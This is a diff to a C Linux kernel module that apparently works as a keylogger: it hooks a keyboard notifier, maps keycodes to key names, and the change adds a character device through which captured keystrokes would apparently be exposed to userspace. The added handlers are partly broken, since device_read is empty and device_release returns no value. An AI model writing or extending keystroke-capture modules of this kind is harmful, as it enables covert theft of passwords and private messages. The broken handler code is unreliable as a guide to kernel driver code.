@@ -20,7 +20,12 @@
 #include <linux/module.h>
 #include <linux/keyboard.h>
 #include <linux/input.h>
+#include <linux/fs.h>
+
+#define DEVICE_NAME "chardev"
 struct semaphore sem;
+
+static int major;
 
 static const char* keymap[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "_BACKSPACE_", "_TAB_",
   "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "_ENTER_", "_CTRL_", "a", "s", "d", "f",
@@ -45,6 +50,36 @@ static const char* keymapShiftActivated[] =
 
 static int shiftKeyDepressed = 0;
 
+static int is_device_open = 0;
+
+static int device_release(struct inode *inode, struct file *file) {
+
+  --is_device_open;
+  module_put(THIS_MODULE);
+}
+static ssize_t device_read(struct file *filp, char *buffer, size_t length, loff_t *offset) {
+
+}
+static int device_open(struct inode *inode, struct file *file) {
+  
+  if(is_device_open)
+    return -EBUSY;
+
+  ++is_device_open;
+  
+  try_module_get(THIS_MODULE);
+  return 0;
+}
+static ssize_t device_write(struct file *filp, const char *buff, size_t len, loff_t *off) {
+  printk(KERN_ALERT "This operation is not supported\n");
+  return -EINVAL;
+}
+static struct file_operations fops = {
+  .read = device_read,
+  .write = device_write,
+  .open = device_open,
+  .release = device_release
+};
 int notify_intercept(struct notifier_block *nblock,  unsigned long code, void *_param) {
   struct keyboard_notifier_param *param = _param;
   if(code == KBD_KEYCODE) {
@@ -76,11 +111,17 @@ static struct notifier_block nb = {
 };
 
 static int __init kl_init(void) {
+  major = register_chrdev(0, DEVICE_NAME, &fops); 
+  if(major < 0) {
+    printk(KERN_ALERT "Unable to register char device %d\n",major);
+    return major;
+  }
   register_keyboard_notifier(&nb);
   sema_init(&sem,1);
   return 0;
 }
 static void __exit kl_exit(void) {
+  unregister_chrdev(major,DEVICE_NAME);
   unregister_keyboard_notifier(&nb);
 }
 module_init(kl_init);
